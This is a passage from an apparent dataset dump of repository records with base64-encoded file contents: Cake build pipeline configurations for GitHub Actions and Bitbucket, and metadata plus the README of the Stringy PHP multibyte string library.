YW1lOiBSdW4gQ2FrZSBzY3JpcHQKICAgICAgICB1c2VzOiBlY2FtcGlkb2ds
aW8vY2FrZS1hY3Rpb25AdjEuMS4wCiAgICAgICAgZW52OgogICAgICAgICAg
RE9UTkVUX1JPTExfRk9SV0FSRF9PTl9OT19DQU5ESURBVEVfRlg6IDIKICAg
ICAgICB3aXRoOgogICAgICAgICAgdGFyZ2V0OiBSdW4tVW5pdC1UZXN0cwog
ICAgICAgICAgY2FrZS1ib290c3RyYXA6IHRydWUK
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"IyBDYWtlIEJpdGJ1Y2tldCBQaXBlbGluZQppbWFnZTogY2FrZWJ1aWxkL2Nh
a2U6Mi4xLXNkay1tb25vCgpwaXBlbGluZXM6CiAgZGVmYXVsdDoKICAgIC0g
c3RlcDoKICAgICAgICBzY3JpcHQ6CiAgICAgICAgICAtIC4vYnVpbGQuc2gg
LS10YXJnZXQ9IlJ1bi1Vbml0LVRlc3RzIgo=
",,,,,,,,,,,,,,,,,,,,,,,
b'Stringy',11291794,b'A PHP string manipulation library with multibyte support',b'PHP',27,2382,,2382,False,b'https://api.github.com/repos/danielstjules/Stringy/forks',"IVtTdHJpbmd5XShodHRwOi8vZGFuaWVsc3RqdWxlcy5jb20vZ2l0aHViL3N0
cmluZ3ktbG9nby5wbmcpCgpBIFBIUCBzdHJpbmcgbWFuaXB1bGF0aW9uIGxp
YnJhcnkgd2l0aCBtdWx0aWJ5dGUgc3VwcG9ydC4gQ29tcGF0aWJsZSB3aXRo
IFBIUAo1LjQrLCBQSFAgNyssIGFuZCBISFZNLgoKYGBgIHBocApzKCdzdHJp
bmcnKS0+dG9UaXRsZUNhc2UoKS0+ZW5zdXJlUmlnaHQoJ3knKSA9PSAnU3Ry
aW5neScKYGBgCgpSZWZlciB0byB0aGUgWzEueCBicmFuY2hdKGh0dHBzOi8v
Z2l0aHViLmNvbS9kYW5pZWxzdGp1bGVzL1N0cmluZ3kvdHJlZS8xLngpIG9y
ClsyLnggYnJhbmNoXShodHRwczovL2dpdGh1Yi5jb20vZGFuaWVsc3RqdWxl
cy9TdHJpbmd5L3RyZWUvMi54KSBmb3Igb2xkZXIKZG9jdW1lbnRhdGlvbi4K
ClshW0J1aWxkIFN0YXR1c10oaHR0cHM6Ly9hcGkudHJhdmlzLWNpLm9yZy9k
YW5pZWxzdGp1bGVzL1N0cmluZ3kuc3ZnP2JyYW5jaD1tYXN0ZXIpXShodHRw
czovL3RyYXZpcy1jaS5vcmcvZGFuaWVsc3RqdWxlcy9TdHJpbmd5KQpbIVtU
b3RhbCBEb3dubG9hZHNdKGh0dHBzOi8vcG9zZXIucHVneC5vcmcvZGFuaWVs
c3RqdWxlcy9zdHJpbmd5L2Rvd25sb2FkcyldKGh0dHBzOi8vcGFja2FnaXN0
Lm9yZy9wYWNrYWdlcy9kYW5pZWxzdGp1bGVzL3N0cmluZ3kpClshW0xpY2Vu
c2VdKGh0dHBzOi8vcG9zZXIucHVneC5vcmcvZGFuaWVsc3RqdWxlcy9zdHJp
bmd5L2xpY2Vuc2UpXShodHRwczovL3BhY2thZ2lzdC5vcmcvcGFja2FnZXMv
ZGFuaWVsc3RqdWxlcy9zdHJpbmd5KQoKKiBbV2h5P10oI3doeSkKKiBbSW5z
dGFsbGF0aW9uXSgjaW5zdGFsbGF0aW9uKQoqIFtPTyBhbmQgQ2hhaW5pbmdd
KCNvby1hbmQtY2hhaW5pbmcpCiogW0ltcGxlbWVudGVkIEludGVyZmFjZXNd
KCNpbXBsZW1lbnRlZC1pbnRlcmZhY2VzKQoqIFtQSFAgNS42IENyZWF0aW9u
XSgjcGhwLTU2LWNyZWF0aW9uKQoqIFtTdGF0aWNTdHJpbmd5XSgjc3RhdGlj
c3RyaW5neSkKKiBbQ2xhc3MgbWV0aG9kc10oI2NsYXNzLW1ldGhvZHMpCiAg
ICAqIFtjcmVhdGVdKCNjcmVhdGVtaXhlZC1zdHItLWVuY29kaW5nLSkKKiBb
SW5zdGFuY2UgbWV0aG9kc10oI2luc3RhbmNlLW1ldGhvZHMpCjx0YWJsZT4K
ICAgIDx0cj4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2FwcGVuZHN0cmluZy1z
dHJpbmciPmFwcGVuZDwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIj
YXRpbnQtaW5kZXgiPmF0PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9
IiNiZXR3ZWVuc3RyaW5nLXN0YXJ0LXN0cmluZy1lbmQtLWludC1vZmZzZXQi
PmJldHdlZW48L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2NhbWVs
aXplIj5jYW1lbGl6ZTwvYT48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAg
ICAgICA8dGQ+PGEgaHJlZj0iI2NoYXJzIj5jaGFyczwvYT48L3RkPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjY29sbGFwc2V3aGl0ZXNwYWNlIj5jb2xsYXBz
ZVdoaXRlc3BhY2U8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2Nv
bnRhaW5zc3RyaW5nLW5lZWRsZS0tYm9vbGVhbi1jYXNlc2Vuc2l0aXZlLS10
cnVlLSI+Y29udGFpbnM8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0i
I2NvbnRhaW5zYWxsYXJyYXktbmVlZGxlcy0tYm9vbGVhbi1jYXNlc2Vuc2l0
aXZlLS10cnVlLSI+Y29udGFpbnNBbGw8L2E+PC90ZD4KICAgIDwvdHI+CiAg
ICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNjb250YWluc2FueWFycmF5
LW5lZWRsZXMtLWJvb2xlYW4tY2FzZXNlbnNpdGl2ZS0tdHJ1ZS0iPmNvbnRh
aW5zQW55PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNjb3VudHN1
YnN0cnN0cmluZy1zdWJzdHJpbmctLWJvb2xlYW4tY2FzZXNlbnNpdGl2ZS0t
dHJ1ZS0iPmNvdW50U3Vic3RyPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhy
ZWY9IiNkYXNoZXJpemUiPmRhc2hlcml6ZTwvYT48L3RkPgogICAgICAgIDx0
ZD48YSBocmVmPSIjZGVsaW1pdGludC1kZWxpbWl0ZXIiPmRlbGltaXQ8L2E+
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9
IiNlbmRzd2l0aHN0cmluZy1zdWJzdHJpbmctLWJvb2xlYW4tY2FzZXNlbnNp
dGl2ZS0tdHJ1ZS0iPmVuZHNXaXRoPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxh
IGhyZWY9IiNlbmRzd2l0aGFueXN0cmluZy1zdWJzdHJpbmdzLS1ib29sZWFu
LWNhc2VzZW5zaXRpdmUtLXRydWUtIj5lbmRzV2l0aEFueTwvYT48L3RkPgog
ICAgICAgIDx0ZD48YSBocmVmPSIjZW5zdXJlbGVmdHN0cmluZy1zdWJzdHJp
bmciPmVuc3VyZUxlZnQ8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0i
I2Vuc3VyZXJpZ2h0c3RyaW5nLXN1YnN0cmluZyI+ZW5zdXJlUmlnaHQ8L2E+
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9
IiNmaXJzdGludC1uIj5maXJzdDwvYT48L3RkPgogICAgICAgIDx0ZD48YSBo
cmVmPSIjZ2V0ZW5jb2RpbmciPmdldEVuY29kaW5nPC9hPjwvdGQ+CiAgICAg
ICAgPHRkPjxhIGhyZWY9IiNoYXNsb3dlcmNhc2UiPmhhc0xvd2VyQ2FzZTwv
YT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjaGFzdXBwZXJjYXNlIj5o
YXNVcHBlckNhc2U8L2E+PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAg
ICAgPHRkPjxhIGhyZWY9IiNodG1sZGVjb2RlIj5odG1sRGVjb2RlPC9hPjwv
dGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNodG1sZW5jb2RlIj5odG1sRW5j
b2RlPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNodW1hbml6ZSI+
aHVtYW5pemU8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2luZGV4
b2ZzdHJpbmctbmVlZGxlLS1vZmZzZXQtLTAtIj5pbmRleE9mPC9hPjwvdGQ+
CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48YSBocmVmPSIjaW5k
ZXhvZmxhc3RzdHJpbmctbmVlZGxlLS1vZmZzZXQtLTAtIj5pbmRleE9mTGFz
dDwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjaW5zZXJ0aW50LWlu
ZGV4LXN0cmluZy1zdWJzdHJpbmciPmluc2VydDwvYT48L3RkPgogICAgICAg
IDx0ZD48YSBocmVmPSIjaXNhbHBoYSI+aXNBbHBoYTwvYT48L3RkPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjaXNhbHBoYW51bWVyaWMiPmlzQWxwaGFudW1l
cmljPC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48
YSBocmVmPSIjaXNiYXNlNjQiPmlzQmFzZTY0PC9hPjwvdGQ+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiNpc2JsYW5rIj5pc0JsYW5rPC9hPjwvdGQ+CiAgICAg
ICAgPHRkPjxhIGhyZWY9IiNpc2hleGFkZWNpbWFsIj5pc0hleGFkZWNpbWFs
PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNpc2pzb24iPmlzSnNv
bjwvYT48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8dGQ+PGEg
aHJlZj0iI2lzbG93ZXJjYXNlIj5pc0xvd2VyQ2FzZTwvYT48L3RkPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjaXNzZXJpYWxpemVkIj5pc1NlcmlhbGl6ZWQ8
L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2lzdXBwZXJjYXNlIj5p
c1VwcGVyQ2FzZTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjbGFz
dGludC1uIj5sYXN0PC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjbGVuZ3RoIj5sZW5ndGg8L2E+PC90ZD4KICAg
ICAgICA8dGQ+PGEgaHJlZj0iI2xpbmVzIj5saW5lczwvYT48L3RkPgogICAg
ICAgIDx0ZD48YSBocmVmPSIjbG9uZ2VzdGNvbW1vbnByZWZpeHN0cmluZy1v
dGhlcnN0ciI+bG9uZ2VzdENvbW1vblByZWZpeDwvYT48L3RkPgogICAgICAg
IDx0ZD48YSBocmVmPSIjbG9uZ2VzdGNvbW1vbnN1ZmZpeHN0cmluZy1vdGhl
cnN0ciI+bG9uZ2VzdENvbW1vblN1ZmZpeDwvYT48L3RkPgogICAgPC90cj4K
ICAgIDx0cj4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2xvbmdlc3Rjb21tb25z
dWJzdHJpbmdzdHJpbmctb3RoZXJzdHIiPmxvbmdlc3RDb21tb25TdWJzdHJp
bmc8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI2xvd2VyY2FzZWZp
cnN0Ij5sb3dlckNhc2VGaXJzdDwvYT48L3RkPgogICAgICAgIDx0ZD48YSBo
cmVmPSIjcGFkaW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0ci0tLS0tc3RyaW5n
LXBhZHR5cGUtLXJpZ2h0LSI+cGFkPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxh
IGhyZWY9IiNwYWRib3RoaW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0ci0tLS0i
PnBhZEJvdGg8L2E+PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiNwYWRsZWZ0aW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0
ci0tLS0iPnBhZExlZnQ8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0i
I3BhZHJpZ2h0aW50LWxlbmd0aC0tc3RyaW5nLXBhZHN0ci0tLS0iPnBhZFJp
Z2h0PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNwcmVwZW5kc3Ry
aW5nLXN0cmluZyI+cHJlcGVuZDwvYT48L3RkPgogICAgICAgIDx0ZD48YSBo
cmVmPSIjcmVnZXhyZXBsYWNlc3RyaW5nLXBhdHRlcm4tc3RyaW5nLXJlcGxh
Y2VtZW50LS1zdHJpbmctb3B0aW9ucy0tbXNyIj5yZWdleFJlcGxhY2U8L2E+
PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9
IiNyZW1vdmVsZWZ0c3RyaW5nLXN1YnN0cmluZyI+cmVtb3ZlTGVmdDwvYT48
L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjcmVtb3ZlcmlnaHRzdHJpbmct
c3Vic3RyaW5nIj5yZW1vdmVSaWdodDwvYT48L3RkPgogICAgICAgIDx0ZD48
YSBocmVmPSIjcmVwZWF0aW50LW11bHRpcGxpZXIiPnJlcGVhdDwvYT48L3Rk
PgogICAgICAgIDx0ZD48YSBocmVmPSIjcmVwbGFjZXN0cmluZy1zZWFyY2gt
c3RyaW5nLXJlcGxhY2VtZW50Ij5yZXBsYWNlPC9hPjwvdGQ+CiAgICA8L3Ry
PgogICAgPHRyPgogICAgICAgIDx0ZD48YSBocmVmPSIjcmV2ZXJzZSI+cmV2
ZXJzZTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjc2FmZXRydW5j
YXRlaW50LWxlbmd0aC0tc3RyaW5nLXN1YnN0cmluZy0tLSI+c2FmZVRydW5j
YXRlPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNzaHVmZmxlIj5z
aHVmZmxlPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiNzbHVnaWZ5
LXN0cmluZy1yZXBsYWNlbWVudC0tLS0tc3RyaW5nLWxhbmd1YWdlLS1lbiI+
c2x1Z2lmeTwvYT48L3RkPgogICAgPC90cj4KICAgIDx0cj4KICAgICAgICA8
dGQ+PGEgaHJlZj0iI3NsaWNlaW50LXN0YXJ0LS1pbnQtZW5kLSI+c2xpY2U8
L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3NwbGl0c3RyaW5nLXBh
dHRlcm4tLWludC1saW1pdC0iPnNwbGl0PC9hPjwvdGQ+CiAgICAgICAgPHRk
PjxhIGhyZWY9IiNzdGFydHN3aXRoc3RyaW5nLXN1YnN0cmluZy0tYm9vbGVh
bi1jYXNlc2Vuc2l0aXZlLS10cnVlLSI+c3RhcnRzV2l0aDwvYT48L3RkPgog
ICAgICAgIDx0ZD48YSBocmVmPSIjc3RhcnRzd2l0aGFueXN0cmluZy1zdWJz
dHJpbmdzLS1ib29sZWFuLWNhc2VzZW5zaXRpdmUtLXRydWUtIj5zdGFydHNX
aXRoQW55PC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0
ZD48YSBocmVmPSIjc3RyaXB3aGl0ZXNwYWNlIj5zdHJpcFdoaXRlc3BhY2U8
L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3N1YnN0cmludC1zdGFy
dC0taW50LWxlbmd0aC0iPnN1YnN0cjwvYT48L3RkPgogICAgICAgIDx0ZD48
YSBocmVmPSIjc3Vycm91bmRzdHJpbmctc3Vic3RyaW5nIj5zdXJyb3VuZDwv
YT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjc3dhcGNhc2UiPnN3YXBD
YXNlPC9hPjwvdGQ+CiAgICA8L3RyPgogICAgPHRyPgogICAgICAgIDx0ZD48
YSBocmVmPSIjdGlkeSI+dGlkeTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBo
cmVmPSIjdGl0bGVpemUtYXJyYXktaWdub3JlIj50aXRsZWl6ZTwvYT48L3Rk
PgogICAgICAgIDx0ZD48YSBocmVmPSIjdG9hc2NpaS1zdHJpbmctbGFuZ3Vh
Z2UtLWVuLS1ib29sLXJlbW92ZXVuc3VwcG9ydGVkLS10cnVlLSI+dG9Bc2Np
aTwvYT48L3RkPgogICAgICAgIDx0ZD48YSBocmVmPSIjdG9ib29sZWFuIj50
b0Jvb2xlYW48L2E+PC90ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiN0b2xvd2VyY2FzZSI+dG9Mb3dlckNhc2U8L2E+PC90
ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3Rvc3BhY2VzLXRhYmxlbmd0aC0t
NC0iPnRvU3BhY2VzPC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0
b3RhYnMtdGFibGVuZ3RoLS00LSI+dG9UYWJzPC9hPjwvdGQ+CiAgICAgICAg
PHRkPjxhIGhyZWY9IiN0b3RpdGxlY2FzZSI+dG9UaXRsZUNhc2U8L2E+PC90
ZD4KICAgIDwvdHI+CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0
b3VwcGVyY2FzZSI+dG9VcHBlckNhc2U8L2E+PC90ZD4KICAgICAgICA8dGQ+
PGEgaHJlZj0iI3RyaW0tc3RyaW5nLWNoYXJzIj50cmltPC9hPjwvdGQ+CiAg
ICAgICAgPHRkPjxhIGhyZWY9IiN0cmltbGVmdC1zdHJpbmctY2hhcnMiPnRy
aW1MZWZ0PC9hPjwvdGQ+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0cmltcmln
aHQtc3RyaW5nLWNoYXJzIj50cmltUmlnaHQ8L2E+PC90ZD4KICAgIDwvdHI+
CiAgICA8dHI+CiAgICAgICAgPHRkPjxhIGhyZWY9IiN0cnVuY2F0ZWludC1s
ZW5ndGgtLXN0cmluZy1zdWJzdHJpbmctLS0iPnRydW5jYXRlPC9hPjwvdGQ+
CiAgICAgICAgPHRkPjxhIGhyZWY9IiN1bmRlcnNjb3JlZCI+dW5kZXJzY29y
ZWQ8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJlZj0iI3VwcGVyY2FtZWxp
emUiPnVwcGVyQ2FtZWxpemU8L2E+PC90ZD4KICAgICAgICA8dGQ+PGEgaHJl
Zj0iI3VwcGVyY2FzZWZpcnN0Ij51cHBlckNhc2VGaXJzdDwvYT48L3RkPgog
ICAgPC90cj4KPC90YWJsZT4KCiogW0V4dGVuc2lvbnNdKCNleHRlbnNpb25z
KQoqIFtUZXN0c10oI3Rlc3RzKQoqIFtMaWNlbnNlXSgjbGljZW5zZSkKCiMj
IFdoeT8KCkluIHBhcnQgZHVlIHRvIGEgbGFjayBvZiBtdWx0aWJ5dGUgc3Vw
cG9ydCAoaW5jbHVkaW5nIFVURi04KSBhY3Jvc3MgbWFueSBvZgpQSFAncyBz
dGFuZGFyZCBzdHJpbmcgZnVuY3Rpb25zLiBCdXQgYWxzbyB0byBvZmZlciBh
biBPTyB3cmFwcGVyIGFyb3VuZCB0aGUKYG1ic3RyaW5nYCBtb2R1bGUncyBt
dWx0aWJ5dGUtY29tcGF0aWJsZSBmdW5jdGlvbnMuIFN0cmluZ3kgaGFuZGxl
cyBzb21lIHF1aXJrcywKcHJvdmlkZXMgYWRkaXRpb25hbCBmdW5jdGlvbmFs
aXR5LCBhbmQgaG9wZWZ1bGx5IG1ha2VzIHN0cmluZ3MgYSBsaXR0bGUgZWFz
aWVyCnRvIHdvcmsgd2l0aCEKCmBgYHBocAovLyBTdGFuZGFyZCBsaWJyYXJ5
CnN0cnRvdXBwZXIoJ2bDssO0YsOgxZknKTsgICAgICAgLy8gJ0bDssO0QsOg
xZknCnN0cmxlbignZsOyw7Riw6DFmScpOyAgICAgICAgICAgLy8gMTAKCi8v
IG1ic3RyaW5nCm1iX3N0cnRvdXBwZXIoJ2bDssO0YsOgxZknKTsgICAgLy8g
J0bDksOUQsOAxZgnCm1iX3N0cmxlbignZsOyw7Riw6DFmScpOyAgICAgICAg
Ly8gJzYnCgovLyBTdHJpbmd5CnMoJ2bDssO0YsOgxZknKS0+dG9VcHBlckNh
c2UoKTsgLy8gJ0bDksOUQsOAxZgnCnMoJ2bDssO0YsOgxZknKS0+bGVuZ3Ro
KCk7ICAgICAgLy8gJzYnCmBgYAoKIyMgSW5zdGFsbGF0aW9uCgpJZiB5b3Un
cmUgdXNpbmcgQ29tcG9zZXIgdG8gbWFuYWdlIGRlcGVuZGVuY2llcywgeW91
IGNhbiBpbmNsdWRlIHRoZSBmb2xsb3dpbmcKaW4geW91ciBjb21wb3Nlci5q
c29uIGZpbGU6CgpgYGBqc29uCiJyZXF1aXJlIjogewogICAgImRhbmllbHN0
anVsZXMvc3RyaW5neSI6ICJ+My4xLjAiCn0KYGBgCgpUaGVuLCBhZnRlciBy
dW5uaW5nIGBjb21wb3NlciB1cGRhdGVgIG9yIGBwaHAgY29tcG9zZXIucGhh
ciB1cGRhdGVgLCB5b3UgY2FuCmxvYWQgdGhlIGNsYXNzIHVzaW5nIENvbXBv
c2VyJ3MgYXV0b2xvYWRpbmc6CgpgYGBwaHAKcmVxdWlyZSAndmVuZG9yL2F1
dG9sb2FkLnBocCc7CmBgYAoKT3RoZXJ3aXNlLCB5b3UgY2FuIHNpbXBseSBy
ZXF1aXJlIHRoZSBmaWxlIGRpcmVjdGx5OgoKYGBgcGhwCnJlcXVpcmVfb25j
ZSAncGF0aC90by9TdHJpbmd5L3NyYy9TdHJpbmd5LnBocCc7CmBgYAoKQW5k
IGluIGVpdGhlciBjYXNlLCBJJ2Qgc3VnZ2VzdCB1c2luZyBhbiBhbGlhcy4K
CmBgYHBocAp1c2UgU3RyaW5neVxTdHJpbmd5IGFzIFM7CmBgYAoKUGxlYXNl
IG5vdGUgdGhhdCBTdHJpbmd5IHJlbGllcyBvbiB0aGUgYG1ic3RyaW5nYCBt
b2R1bGUgZm9yIGl0cyB1bmRlcmx5aW5nCm11bHRpYnl0ZSBzdXBwb3J0LiBJ
ZiB0aGUgbW9kdWxlIGlzIG5vdCBmb3VuZCwgU3RyaW5neSB3aWxsIHVzZQpb
c3ltZm9ueS9wb2x5ZmlsbC1tYnN0cmluZ10oaHR0cHM6Ly9naXRodWIuY29t
L3N5bWZvbnkvcG9seWZpbGwtbWJzdHJpbmcpLgpleC1tYnN0cmluZyBpcyBh
IG5vbi1kZWZhdWx0LCBidXQgdmVyeSBjb21tb24gbW9kdWxlLiBGb3IgZXhh
bXBsZSwgd2l0aCBkZWJpYW4KYW5kIHVidW50dSwgaXQncyBpbmNsdWRlZCBp
biBsaWJhcGFjaGUyLW1vZC1waHA1LCBwaHA1LWNsaSwgYW5kIHBocDUtZnBt
LiBGb3IKT1NYIHVzZXJzLCBpdCdzIGEgZGVmYXVsdCBmb3IgYW55IHZlcnNp
b24gb2YgUEhQIGluc3RhbGxlZCB3aXRoIGhvbWVicmV3LgpJZiBjb21waWxp
bmcgUEhQIGZyb20gc2NyYXRjaCwgaXQgY2FuIGJlIGluY2x1ZGVkIHdpdGgg
dGhlCmAtLWVuYWJsZS1tYnN0cmluZ2AgZmxhZy4KCiMjIE9PIGFuZCBDaGFp
bmluZwoKVGhlIGxpYnJhcnkgb2ZmZXJzIE9PIG1ldGhvZCBjaGFpbmluZywg
YXMgc2VlbiBiZWxvdzoKCmBgYHBocAp1c2UgU3RyaW5neVxTdHJpbmd5IGFz
IFM7CmVjaG8gUzo6Y3JlYXRlKCdmw7LDtCAgICAgYsOgxZknKS0+Y29sbGFw
c2VXaGl0ZXNwYWNlKCktPnN3YXBDYXNlKCk7IC8vICdGw5LDlCBCw4DFmCcK
YGBgCgpgU3RyaW5neVxTdHJpbmd5YCBoYXMgYSBfX3RvU3RyaW5nKCkgbWV0
aG9kLCB3aGljaCByZXR1cm5zIHRoZSBjdXJyZW50IHN0cmluZwp3aGVuIHRo
ZSBvYmplY3QgaXMgdXNlZCBpbiBhIHN0cmluZyBjb250ZXh0LCBpZToKYChz
dHJpbmcpIFM6OmNyZWF0ZSgnZm9vJykgIC8vICdmb28nYAoKIyMgSW1wbGVt
ZW50ZWQgSW50ZXJmYWNlcwoKYFN0cmluZ3lcU3RyaW5neWAgaW1wbGVtZW50
cyB0aGUgYEl0ZXJhdG9yQWdncmVnYXRlYCBpbnRlcmZhY2UsIG1lYW5pbmcg
dGhhdApgZm9yZWFjaGAgY2FuIGJlIHVzZWQgd2l0aCBhbiBpbnN0YW5jZSBv
ZiB0aGUgY2xhc3M6CgpgYGAgcGhwCiRzdHJpbmd5ID0gUzo6Y3JlYXRlKCdm
w7LDtGLDoMWZJyk7CmZvcmVhY2ggKCRzdHJpbmd5IGFzICRjaGFyKSB7CiAg
ICBlY2hvICRjaGFyOwp9Ci8vICdmw7LDtGLDoMWZJwpgYGAKCkl0IGltcGxl
bWVudHMgdGhlIGBDb3VudGFibGVgIGludGVyZmFjZSwgZW5hYmxpbmcgdGhl
IHVzZSBvZiBgY291bnQoKWAgdG8KcmV0cmlldmUgdGhlIG51bWJlciBvZiBj
aGFyYWN0ZXJzIGluIHRoZSBzdHJpbmc6CgpgYGAgcGhwCiRzdHJpbmd5ID0g
Uzo6Y3JlYXRlKCdmw7LDtCcpOwpjb3VudCgkc3RyaW5neSk7ICAvLyAzCmBg
YAoKRnVydGhlcm1vcmUsIHRoZSBgQXJyYXlBY2Nlc3NgIGludGVyZmFjZSBo
YXMgYmVlbiBpbXBsZW1lbnRlZC4gQXMgYSByZXN1bHQsCmBpc3NldCgpYCBj
YW4gYmUgdXNlZCB0byBjaGVjayBpZiBhIGNoYXJhY3RlciBhdCBhIHNwZWNp
ZmljIGluZGV4IGV4aXN0cy4gQW5kCnNpbmNlIGBTdHJpbmd5XFN0cmluZ3lg
IGlzIGltbXV0YWJsZSwgYW55IGNhbGwgdG8gYG9mZnNldFNldGAgb3IgYG9m
ZnNldFVuc2V0YAp3aWxsIHRocm93IGFuIGV4Y2VwdGlvbi4gYG9mZnNldEdl
dGAgaGFzIGJlZW4gaW1wbGVtZW50ZWQsIGhvd2V2ZXIsIGFuZCBhY2NlcHRz
CmJvdGggcG9zaXRpdmUgYW5kIG5lZ2F0aXZlIGluZGV4ZXMuIEludmFsaWQg
aW5kZXhlcyByZXN1bHQgaW4gYW4KYE91dE9mQm91bmRzRXhjZXB0aW9uYC4K
CmBgYCBwaHAKJHN0cmluZ3kgPSBTOjpjcmVhdGUoJ2LDoMWZJyk7CmVjaG8g
JHN0cmluZ3lbMl07ICAgICAvLyAnxZknCmVjaG8gJHN0cmluZ3lbLTJdOyAg
ICAvLyAnw6AnCmlzc2V0KCRzdHJpbmd5Wy00XSk7ICAvLyBmYWxzZQoKJHN0
cmluZ3lbM107ICAgICAgICAgIC8vIE91dE9mQm91bmRzRXhjZXB0aW9uCiRz
dHJpbmd5WzJdID0gJ2EnOyAgICAvLyBFeGNlcHRpb24KYGBgCgojIyBQSFAg
NS42IENyZWF0aW9uCgpBcyBvZiBQSFAgNS42LCBbYHVzZSBmdW5jdGlvbmBd
KGh0dHBzOi8vd2lraS5waHAubmV0L3JmYy91c2VfZnVuY3Rpb24pIGlzCmF2
YWlsYWJsZSBmb3IgaW1wb3J0aW5nIGZ1bmN0aW9ucy4gU3RyaW5neSBleHBv
c2VzIGEgbmFtZXNwYWNlZCBmdW5jdGlvbiwKYFN0cmluZ3lcY3JlYXRlYCwg
d2hpY2ggZW1pdHMgdGhlIHNhbWUgYmVoYXZpb3VyIGFzIGBTdHJpbmd5XFN0
cmluZ3k6OmNyZWF0ZSgpYC4KSWYgcnVubmluZyBQSFAgNS42LCBvciBhbm90
aGVyIHJ1bnRpbWUgdGhhdCBzdXBwb3J0cyB0aGUgYHVzZSBmdW5jdGlvbmAg
c3ludGF4LAp5b3UgY2FuIHRha2UgYWR2YW50YWdlIG9mIGFuIGV2ZW4gc2lt
cGxlciBBUEkgYXMgc2VlbiBiZWxvdzoKCmBgYCBwaHAKdXNlIGZ1bmN0aW9u
IFN0cmluZ3lcY3JlYXRlIGFzIHM7CgovLyBJbnN0ZWFkIG9mOiBTOjpjcmVh
dGUoJ2bDssO0ICAgICBiw6DFmScpCnMoJ2bDssO0ICAgICBiw6DFmScpLT5j
b2xsYXBzZVdoaXRlc3BhY2UoKS0+c3dhcENhc2UoKTsKYGBgCgojIyBTdGF0
aWNTdHJpbmd5CgpBbGwgbWV0aG9kcyBsaXN0ZWQgdW5kZXIgIkluc3RhbmNl
IG1ldGhvZHMiIGFyZSBhdmFpbGFibGUgYXMgcGFydCBvZiBhIHN0YXRpYwp3
cmFwcGVyLiBGb3IgU3RhdGljU3RyaW5neSBtZXRob2RzLCB0aGUgb3B0aW9u
YWwgZW5jb2RpbmcgaXMgZXhwZWN0ZWQgdG8gYmUgdGhlCmxhc3QgYXJndW1l
bnQuIFRoZSByZXR1cm4gdmFsdWUgaXMgbm90IGNhc3QsIGFuZCBtYXkgdGh1
